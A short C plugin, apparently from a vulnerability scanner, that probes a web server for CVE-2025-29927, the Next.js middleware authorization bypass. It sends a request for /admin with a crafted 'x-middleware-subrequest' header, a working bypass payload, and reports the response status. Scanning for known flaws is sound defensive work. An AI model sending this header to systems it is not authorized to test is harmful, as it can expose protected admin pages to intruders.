/* http-vuln-cve2025-29927-4 - Next.js middleware auth bypass probe. */
#include "arsenal_util.h"

int almap_script_run(AlScriptContext *ctx) {
    char resp[8192];
    int n;

    if (!ar_valid(ctx)) {
        return 1;
    }
    n = ar_http_request(ctx, "GET", "/admin", NULL, "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware\r\n", NULL, NULL,
                        resp, sizeof(resp));
    if (n <= 0) {
        ar_out(ctx, "http-vuln-cve2025-29927-4: no HTTP response");
        return 0;
    }
    ar_out(ctx, "probe sent: /admin [%d] (CVE-2025-29927; verify out-of-band)",
           ar_http_status(resp));
    return 0;
}
